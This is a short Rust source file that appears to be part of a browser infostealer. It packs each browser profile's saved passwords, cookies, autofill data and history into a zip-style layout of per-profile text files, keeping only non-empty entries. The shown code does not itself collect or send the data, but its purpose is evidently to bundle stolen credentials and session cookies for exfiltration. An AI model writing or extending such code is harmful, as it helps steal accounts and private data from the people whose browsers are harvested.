//! Zip layout: Browser/Profile/{passwords,cookies,autofill,history}.txt (non-empty only)

fn has_text(content: &str) -> bool {
    !content.trim().is_empty()
}

fn has_cookie_data(content: &str) -> bool {
    content.lines().any(|line| {
        let t = line.trim();
        !t.is_empty() && !t.starts_with('#')
    })
}

pub fn push_profile_bundle(
    results: &mut Vec<(String, String)>,
    browser: &str,
    profile: &str,
    passwords: Option<String>,
    cookies: Option<String>,
    autofill: Option<String>,
    history: Option<String>,
) {
    let base = format!("{browser}/{profile}");

    if let Some(content) = passwords.filter(|c| has_text(c)) {
        results.push((format!("{base}/passwords.txt"), content));
    }
    if let Some(content) = cookies.filter(|c| has_cookie_data(c)) {
        results.push((format!("{base}/cookies.txt"), content));
    }
    if let Some(content) = autofill.filter(|c| has_text(c)) {
        results.push((format!("{base}/autofill.txt"), content));
    }
    if let Some(content) = history.filter(|c| has_text(c)) {
        results.push((format!("{base}/history.txt"), content));
    }
}

pub fn sort_entries(files: &mut [(String, String)]) {
    files.sort_by(|a, b| a.0.cmp(&b.0));
}
